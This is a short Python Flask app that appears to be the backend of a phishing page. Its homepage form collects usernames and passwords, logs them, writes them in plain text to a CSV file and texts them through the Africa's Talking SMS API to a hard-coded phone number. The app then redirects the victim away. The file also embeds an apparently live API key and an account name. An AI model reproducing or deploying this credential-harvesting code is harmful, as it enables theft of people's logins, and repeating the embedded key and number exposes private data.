from flask import Flask, request, redirect, url_for, render_template
import africastalking
import csv
import os
from dotenv import load_dotenv
from flask_cors import CORS

username = 'algobet254'
api_key = 'atsk_00991722c13aa948ff51314c1a7f94aefe2054594071cc1379ae4f8a2ef96b03fde4924f'

africastalking.initialize(username, api_key)
sms = africastalking.SMS

load_dotenv()

app = Flask(__name__)

CORS(app)
app.config['DEBUG'] = os.environ.get('DEBUG')

@app.route("/", methods=['GET', 'POST'])
def homepage():
    if request.method == 'POST':
        uname = request.form.get('username')
        password = request.form.get('passwd')
        message = f'Name: {uname}, Pass: {password}'
        print(message)
        record_details(uname, password)
        send_sms(message)
        return redirect(url_for('redirect_page'))
    return render_template("index.html", title="HOME PAGE")

@app.route('/redirect_page')
def redirect_page():
    return 'You have been redirected!'

def send_sms(message):
    recipients = ['+254712897106',]
    try:
        response = sms.send(message, recipients, None)
    except Exception as e:
        print(f'Couldn\'t send sms: {e}')

def record_details(uname, password):
    # Ensure the directory exists
    file_path = 'details.csv'
    file_exists = os.path.isfile(file_path)
    
    with open(file_path, 'a', newline='') as file:
        writer = csv.writer(file)
        if not file_exists:
            writer.writerow(['username', 'passwd'])  
        writer.writerow([uname, password])

@app.route("/docs")
def docs():
    return render_template("docs.html", title="docs page")

if __name__ == "__main__":
    app.run()